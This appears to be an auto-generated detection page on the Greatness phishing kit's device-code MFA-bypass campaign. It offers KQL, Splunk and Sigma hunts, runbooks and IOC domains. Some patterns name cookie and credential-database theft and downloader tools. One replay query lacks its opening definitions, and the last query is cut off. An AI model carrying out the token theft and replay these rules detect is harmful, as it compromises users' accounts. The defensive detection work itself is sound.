Greatness PhaaS Adds Device Code Phishing to Bypass MFA and Steal Tokens

The Hacker News
2026-08-04 13 use cases 6 techniques 5 kill-chain phases detected

The commercial phishing-as-a-service (PhaaS) toolkit known as Greatness has become the latest crimeware solution to add support for device code phishing, a rapidly growing cyber threat that abuses the legitimate OAuth 2.0 Device Authorization Grant to bypass Multi-Factor Authentication (MFA) and seize control of user accounts. Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] RingCentral voicemail lure delivered to Inbox despite SPF/DKIM/DMARC failure (safe-sender bypass) · [LLM] Greatness phishing redirect-chain domains resolved/contacted by endpoints · Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] M365 device-code grant sign-in abused for MFA-bypass token theft (Greatness PhaaS) · Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha)
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] New device registration / PRT minting minutes after an Entra sign-in (post-token persistence)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Stolen-token replay: non-interactive M365 auth from new IP minutes after interactive login · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Replayed token fan-out: single identity enumerating many M365 resources in a short window · Infostealer — non-browser process accessing browser cookie/login DBs · OAuth consent / suspicious app grant
M365 device-code grant sign-in abused for MFA-bypass token theft (Greatness PhaaS) AIExploitation High
Hunts successful Entra ID sign-ins that used the OAuth 2.0 device authorization grant flow, the new Greatness PhaaS capability used to silently mint tokens without a fake login page. Filters out legitimate developer/admin device-code tooling so only anomalous device-code auth to end-user apps surfaces. Rationale: Anchors on the article's headline TTP — the OAuth device authorization grant added to Greatness — detected via the deviceCode authentication protocol string, with the standard developer-tool allowlist that second sources (Silverfort, Splunk Security Content) flag as the primary FP class. Cross-checked against: • https://www.silverfort.com/blog/device-code-attacks-in-azure-from-exploitation-to-detection/ • https://research.splunk.com/cloud/d68d8732-6f7e-4ee5-a6eb-737f2b990b91/ • https://attack.mitre.org/techniques/T1528/ • https://zerobec.com/blog
ATT&CKT1528 T1621 T1078.004
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Developer/admin authenticating to Azure CLI, Az PowerShell or Graph CLI from a terminal
  • Smart-TV / conference-room / IoT device enrollment using device code
  • AzCopy or storage tooling using device code flow
  • Legitimate first-party app onboarding a headless device
  • Security teams running their own device-code phishing simulations
Suppression filter
| where DeviceTrustType !in~ ("Azure AD joined","Hybrid Azure AD joined") or isempty(DeviceTrustType)
Response runbook
1) Triage: pull the sign-in's AccountUpn, IPAddress, AppDisplayName and UserAgent; confirm whether the user legitimately runs CLI/headless tooling and whether the IP/geo matches their norm. 2) Contain: if unexplained, revoke the user's refresh tokens (Revoke-MgUserSignInSession), force password reset + re-MFA, and block the source IP; review Conditional Access to disable device-code flow for non-privileged users. 3) Hunt: pivot on AccountObjectId for follow-on non-interactive token replay from new IPs, new device registrations, inbox-rule creation and Graph enumeration within the following hours.
AADSignInEventsBeta
| where Timestamp > ago(14d)
| where ErrorCode == 0
| where AuthenticationProcessingDetails has_any ("deviceCode", "Device Code Flow", "Device Code")
| where AppDisplayName !in~ ("Microsoft Azure CLI","Microsoft Azure PowerShell","Microsoft Graph Command Line Tools","Microsoft Authentication Broker","Azure Active Directory PowerShell","Visual Studio Code","Microsoft Docs")
| project Timestamp, AccountUpn, AccountObjectId, AppDisplayName, ApplicationId, ResourceDisplayName, IPAddress, Country, City, DeviceName, DeviceTrustType, UserAgent, ClientAppUsed
| order by Timestamp desc
SigninLogs
| where TimeGenerated > ago(14d)
| where ResultType == 0
| where AuthenticationProcessingDetails has_any ("deviceCode", "Device Code Flow", "Device Code")
| where AppDisplayName !in~ ("Microsoft Azure CLI","Microsoft Azure PowerShell","Microsoft Graph Command Line Tools","Microsoft Authentication Broker","Azure Active Directory PowerShell","Visual Studio Code","Microsoft Docs")
| project TimeGenerated, UserPrincipalName, UserId, AppDisplayName, AppId, ResourceDisplayName, IPAddress, tostring(Location), UserAgent, ClientAppUsed
| order by TimeGenerated desc

RingCentral voicemail lure delivered to Inbox despite SPF/DKIM/DMARC failure (safe-sender bypass) AIDelivery Medium
Hunts inbound voicemail-themed mail impersonating RingCentral that fails email authentication yet lands in the Inbox — the safe-sender/allowlist-exclusion abuse Greatness operators use against orgs that are real RingCentral customers. Article-specific because it pairs vendor impersonation with auth failure AND successful Inbox delivery. Rationale: Uses the article's exact tradecraft — RingCentral voicemail lures failing SPF/DKIM/DMARC but delivered via safe-sender exclusions — combining SenderDisplayName/domain impersonation, auth-failure parsing of AuthenticationDetails, and Inbox delivery (would normally be junked/quarantined) for high specificity. Sentinel left blank: mailflow (EmailEvents/EmailUrlInfo) has no equivalent table in this tenant's provided Sentinel schema. Cross-checked against: • https://zerobec.com/blog • https://thehackernews.com/2026/08/greatness-phaas-adds-device-code.html
ATT&CKT1566.002 T1656
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Genuine RingCentral notification whose DKIM broke due to a forwarding/relay rewrite
  • Marketing/newsletter mail from a mis-configured RingCentral partner domain
  • Internal PBX/voicemail-to-email integration with imperfect SPF alignment
  • A legitimately allowlisted vendor whose DMARC is set to p=none
  • User-reported ham that was force-delivered by an org transport rule
Suppression filter
| where not (SenderMailFromDomain endswith "ringcentral.com" and Auth has "'SPF':'pass'")
Response runbook
1) Triage: open the message, verify SenderMailFromAddress vs the header From, inspect the embedded URL/UrlDomain and whether any recipient clicked (UrlClickEvents). 2) Contain: soft-delete/zap the message tenant-wide (Get-/New-ComplianceSearch purge), and audit the transport/safe-sender exclusion that permitted delivery — tighten or remove the RingCentral allowlist entry. 3) Hunt: sweep for the same NetworkMessageId cluster / sender across all mailboxes and pivot any clicking users into device-code and token-replay detections.
EmailEvents
| where Timestamp > ago(14d)
| where EmailDirection == "Inbound"
| where DeliveryAction == "Delivered" and DeliveryLocation == "Inbox"
| where SenderDisplayName has "RingCentral" or SenderFromDomain has "ringcentral" or Subject has_any ("voicemail","voice message","new voicemail","missed call")
| extend Auth = tostring(AuthenticationDetails)
| where Auth has_any ("'SPF':'fail'","'DKIM':'fail'","'DMARC':'fail'","spf=fail","dkim=fail","dmarc=fail","compauth: fail","fail (")
| join kind=leftouter (EmailUrlInfo | where Timestamp > ago(14d) | project NetworkMessageId, Url, UrlDomain) on NetworkMessageId
| project Timestamp, NetworkMessageId, SenderFromAddress, SenderMailFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, DeliveryLocation, AuthenticationDetails, Url, UrlDomain
| order by Timestamp desc
// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
// Requires the Microsoft 365 Defender data connector (streams the
// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
EmailEvents
| where TimeGenerated > ago(14d)
| where EmailDirection == "Inbound"
| where DeliveryAction == "Delivered" and DeliveryLocation == "Inbox"
| where SenderDisplayName has "RingCentral" or SenderFromDomain has "ringcentral" or Subject has_any ("voicemail","voice message","new voicemail","missed call")
| extend Auth = tostring(AuthenticationDetails)
| where Auth has_any ("'SPF':'fail'","'DKIM':'fail'","'DMARC':'fail'","spf=fail","dkim=fail","dmarc=fail","compauth: fail","fail (")
| join kind=leftouter (EmailUrlInfo | where TimeGenerated > ago(14d) | project NetworkMessageId, Url, UrlDomain) on NetworkMessageId
| project TimeGenerated, NetworkMessageId, SenderFromAddress, SenderMailFromAddress, SenderDisplayName, RecipientEmailAddress, Subject, DeliveryLocation, AuthenticationDetails, Url, UrlDomain
| order by TimeGenerated desc
Greatness phishing redirect-chain domains resolved/contacted by endpoints AIDelivery Medium
Hunts DNS resolution and email-URL delivery of the specific low-reputation .cfd/.one/.gba/.gbs redirect-chain domains tied to this Greatness campaign, which terminate at the AiTM proxy or device-code endpoint. IOC-driven pivot across mail delivery and endpoint DNS. Rationale: Directly consumes the article's pre-extracted domain IOCs across delivery (EmailUrlInfo), click (UrlClickEvents), and endpoint DNS/network telemetry. Note: these domains are single-source (ZeroBEC via THN) and were not independently confirmed by a second vendor at time of writing — deploy as hunting/enrichment and expire if not corroborated. Cross-checked against: • https://thehackernews.com/2026/08/greatness-phaas-adds-device-code.html • https://zerobec.com/blog
ATT&CKT1204.001 T1566.002
Data sourcesNetwork_Resolution.DNS
Expected false positives · estimated rate: low — model-assessed, tune to your environment
  • Security researcher / sandbox detonating the phishing URL for analysis
  • URL-scanner or SEG crawler resolving the domain from a quarantined message
  • Threat-intel enrichment tooling doing passive DNS lookups
  • A recycled domain now parked on benign hosting
  • Analyst manually visiting the IOC during triage
Response runbook
1) Triage: identify the resolving host/user and whether resolution followed an email click (join NetworkMessageId to EmailEvents); confirm it was a real user browser, not a scanner. 2) Contain: sink-hole/block all listed domains at DNS/proxy and quarantine any delivered mail containing them; if a user reached the endpoint, treat their identity as potentially compromised and revoke tokens. 3) Hunt: pivot the user into the device-code and token-replay UCs and search for new device registrations in the following hours.
let phishDomains = dynamic(["hashmashryshl.cfd","hashmashryly.cfd","onlineyoutlook.one","addtorimez.gba","willgranttblesssecondflier.cfd","lookatcreatilcense.one","pleasebeatwithlllocliad.gbs","wbajp.feelingfor.com"]);
union
  (EmailUrlInfo | where Timestamp > ago(30d) | where UrlDomain in~ (phishDomains) | project Timestamp, Source="EmailUrlInfo", Account="", Detail=Url, Domain=UrlDomain, NetworkMessageId),
  (UrlClickEvents | where Timestamp > ago(30d) | where Url has_any (phishDomains) | project Timestamp, Source="UrlClick", Account=AccountUpn, Detail=Url, Domain="", NetworkMessageId),
  (DeviceNetworkEvents | where Timestamp > ago(30d) | where RemoteUrl has_any (phishDomains) | project Timestamp, Source="DeviceNetwork", Account=InitiatingProcessAccountUpn, Detail=RemoteUrl, Domain="", NetworkMessageId="")
| order by Timestamp desc
let phishDomains = dynamic(["hashmashryshl.cfd","hashmashryly.cfd","onlineyoutlook.one","addtorimez.gba","willgranttblesssecondflier.cfd","lookatcreatilcense.one","pleasebeatwithlllocliad.gbs","wbajp.feelingfor.com"]);
DnsEvents
| where TimeGenerated > ago(30d)
| where Name in~ (phishDomains)
| project TimeGenerated, Computer, ClientIP, Name, QueryType, IPAddresses = Result
| order by TimeGenerated desc

Stolen-token replay: non-interactive M365 auth from new IP minutes after interactive login AICommand & Control Medium
Correlates an interactive Entra sign-in with a successful non-interactive (token-based) sign-in for the same user from a different IP/geo within 30 minutes — the 'tokens replayed within minutes from dedicated proxy infrastructure' behaviour — and additionally flags the known Greatness AiTM proxy IP 38.248.95.214. Rationale: Encodes the article's post-compromise fingerprint — token replayed within minutes from separate proxy infrastructure and continued auth from 38.248.95.214 weeks later — via an interactive-to-non-interactive correlation with an IP/geo mismatch, plus the named IOC. IP is single-source (ZeroBEC via THN); it is used as an additive high-confidence clause alongside the behavioral signal, not the sole predicate. Cross-checked against: • https://thehackernews.com/2026/08/greatness-phaas-adds-device-code.html • https://zerobec.com/blog • https://research.eye.security/device-code-phishing-forensics/
ATT&CKT1550.001 T1090
Data sourcesAuthentication.Authentication
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • User on a mobile carrier NAT whose token refreshes from a different egress IP/country than the browser login
  • Corporate VPN / cloud proxy that terminates non-interactive traffic in another region
  • Roaming user crossing a geo boundary between login and background token use
  • Multi-geo M365 service refreshing tokens from Microsoft datacenter IPs
  • Legitimate session on a second device (phone app) registered to the same user
Suppression filter
| where ReplayIP != IntIP and (ReplayIP == "38.248.95.214" or not(ipv4_is_in_range(ReplayIP, "13.64.0.0/11") or ipv4_is_in_range(ReplayIP, "20.0.0.0/8") or ipv4_is_in_range(ReplayIP, "40.64.0.0/10")))
Response runbook
1) Triage: compare IntIP/IntCountry vs ReplayIP/ReplayCountry and the ASN; confirm whether the replay IP is the known proxy (38.248.95.214) or an unusual hosting/VPS ASN vs the user's normal egress. 2) Contain: revoke refresh tokens and sign-in sessions for the user, force password + MFA reset, and add the replay IP to Conditional Access / firewall block lists. 3) Hunt: pivot on the user for new device registrations, inbox-rule creation, and broad Graph enumeration; search all users for any auth from 38.248.95.214.

| join kind=inner interactiveSignins on AccountObjectId
| where Timestamp between (IntTime .. IntTime + win)
| where IPAddress != IntIP
| where IPAddress == "38.248.95.214" or Country != IntCountry
| project IntTime, ReplayTime = Timestamp, AccountUpn, IntIP, IntCountry, ReplayIP = IPAddress, ReplayCountry = Country, AppDisplayName, ResourceDisplayName
| order by ReplayTime desc
let win = 30m;
let interactive = SigninLogs
| where TimeGenerated > ago(14d)
| where ResultType == 0 and IsInteractive == true
| project IntTime = TimeGenerated, UserId, IntIP = IPAddress, IntLoc = tostring(Location);
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(14d)
| where ResultType == 0
| project TimeGenerated, UserPrincipalName, UserId, IPAddress, Location, AppDisplayName, ResourceDisplayName
| join kind=inner interactive on UserId
| where TimeGenerated between (IntTime .. IntTime + win)
| where IPAddress != IntIP
| where IPAddress == "38.248.95.214" or tostring(Location) != IntLoc
| project IntTime, ReplayTime = TimeGenerated, UserPrincipalName, IntIP, IntLoc, ReplayIP = IPAddress, ReplayLoc = tostring(Location), AppDisplayName, ResourceDisplayName
| order by ReplayTime desc

New device registration / PRT minting minutes after an Entra sign-in (post-token persistence) AIInstallation Medium
Correlates an Entra 'Add device'/'Register device' event with a successful sign-in for the same actor within 60 minutes — the Greatness/Storm-2372 persistence step where the attacker registers a device to mint a Primary Refresh Token right after token theft. Rationale: Targets the article's explicit persistence step (device registration within minutes of the breach to generate a PRT) by correlating Add device/Register device audit events to a recent successful sign-in for the same actor, which alone would be too noisy. Corroborated as Storm-2372 tradecraft by Microsoft/Volexity device-code write-ups. Cross-checked against: • https://thehackernews.com/2026/08/greatness-phaas-adds-device-code.html • https://zerobec.com/blog/debull-storm-2372-microsoft-device-code-phishing-graphspy
ATT&CKT1098.005 T1556.006
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Employee enrolling a legitimate new laptop/phone right after signing in (onboarding day)
  • Intune bulk enrollment / Autopilot provisioning event
  • IT helpdesk re-registering a wiped device for a user
  • BYOD registration during a first-time MFA setup
  • Conditional Access-driven device compliance re-registration
Suppression filter
| where RegIP != SignInIP
Response runbook
1) Triage: confirm whether the registered device is expected (compare RegIP/ActorIP to the user's normal geo and whether it followed a suspicious or device-code sign-in). 2) Contain: if unauthorized, delete/disable the newly registered device object in Entra, revoke the user's tokens and any PRT, and force password + MFA re-registration. 3) Hunt: check the device's subsequent non-interactive sign-ins and Graph activity, and sweep for other users with device registrations from the same actor IP.
let win = 60m;
let signins = AADSignInEventsBeta
| where Timestamp > ago(14d)
| where ErrorCode == 0
| project SignInTime = Timestamp, AccountObjectId, AccountUpn, SignInIP = IPAddress, SignInCountry = Country;
CloudAppEvents
| where Timestamp > ago(14d)
| where ActionType in~ ("Add device","Register device","Add registered owner to device")
| join kind=inner signins on AccountObjectId
| where Timestamp between (SignInTime .. SignInTime + win)
| project SignInTime, DeviceRegTime = Timestamp, AccountUpn = AccountDisplayName, AccountObjectId, SignInIP, SignInCountry, RegIP = IPAddress, ActionType, ObjectName
| order by DeviceRegTime desc
let win = 60m;
let signins = SigninLogs
| where TimeGenerated > ago(14d)
| where ResultType == 0
| project SignInTime = TimeGenerated, UserId, UserPrincipalName, SignInIP = IPAddress;
AuditLogs
| where TimeGenerated > ago(14d)
| where OperationName in~ ("Add device","Register device")
| extend ActorId = tostring(InitiatedBy.user.id), ActorUpn = tostring(InitiatedBy.user.userPrincipalName), ActorIP = tostring(InitiatedBy.user.ipAddress)
| join kind=inner signins on $left.ActorId == $right.UserId
| where TimeGenerated between (SignInTime .. SignInTime + win)
| project SignInTime, DeviceRegTime = TimeGenerated, ActorUpn, SignInIP, ActorIP, OperationName, TargetResources
| order by DeviceRegTime desc

Replayed token fan-out: single identity enumerating many M365 resources in a short window AIActions on Objectives Medium
Detects one user's token accessing 5+ distinct Microsoft 365 resources (Graph, Exchange, SharePoint, Teams, OneDrive) inside a 15-minute window — the broad post-compromise Graph enumeration Greatness operators perform after replaying stolen tokens. Behavioural fan-out, not a single-event IOC. Rationale: Reflects the article's discovery phase — a single replayed token enumerating Outlook/Teams/SharePoint/OneDrive/contacts/calendars via Graph — expressed as a resource fan-out per user per 15m window rather than a signature. MicrosoftGraphActivityLogs would be the ideal source but is absent from this tenant's provided Sentinel schema, so sign-in resource diversity is used as the available proxy. Cross-checked against: • https://thehackernews.com/2026/08/greatness-phaas-adds-device-code.html • https://research.eye.security/device-code-phishing-forensics/
ATT&CKT1526 T1087.004 T1213.002
Data sources
Expected false positives · estimated rate: medium — model-assessed, tune to your environment
  • Power user / executive legitimately opening Outlook, Teams, SharePoint and OneDrive back-to-back after login
  • First sign-in of the day warming multiple M365 service tokens
  • Migration or backup tooling (e.g. AvePoint, Veeam for M365) touching many workloads
  • An admin using a portal that federates multiple resource tokens
  • Mobile Outlook + Teams apps refreshing several resources simultaneously
Suppression filter
| where array_length(IPs) == 1 and tostring(IPs[0]) !startswith "192.168." and tostring(IPs[0]) !startswith "10."
Response runbook
1) Triage: review the IPs and AppDisplayNames in the burst — legit fan-out comes from the user's own devices/known apps; enumeration comes from a single unusual IP/ASN or a consent-granted third-party app. 2) Contain: if malicious, revoke tokens, disable suspicious OAuth app consents, and block the source IP. 3) Hunt: correlate to a preceding device-code or token-replay alert for the same user and check for follow-on inbox-rule creation or bulk mail reads in the subsequent hours.
AADSignInEventsBeta
| where Timestamp > ago(14d)
| where ErrorCode == 0
| summarize Resources = make_set(ResourceDisplayName), ResourceCount = dcount(ResourceDisplayName), IPs = make_set(IPAddress), Apps = make_set(AppDisplayName), FirstSeen = min(Timestamp), LastSeen = max(Timestamp) by AccountUpn, bin(Timestamp, 15m)
| where ResourceCount >= 5   // 5+ distinct M365 resources in 15m = broad enumeration
| where Resources has_any ("Microsoft Graph","Office 365 Exchange Online","Office 365 SharePoint Online","Microsoft Teams","Skype and Teams Tenant Admin API","OneDrive")
| order by LastSeen desc
AADNonInteractiveUserSignInLogs
| where TimeGenerated > ago(14d)
| where ResultType == 0
| summarize Resources = make_set(ResourceDisplayName), ResourceCount = dcount(ResourceDisplayName), IPs = make_set(IPAddress), Apps = make_set(AppDisplayName), FirstSeen = min(TimeGenerated), LastSeen = max(TimeGenerated) by UserPrincipalName, bin(TimeGenerated, 15m)
| where ResourceCount >= 5   // 5+ distinct M365 resources in 15m = broad enumeration
| where Resources has_any ("Microsoft Graph","Office 365 Exchange Online","Office 365 SharePoint Online","Microsoft Teams","OneDrive")
| order by LastSeen desc
Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
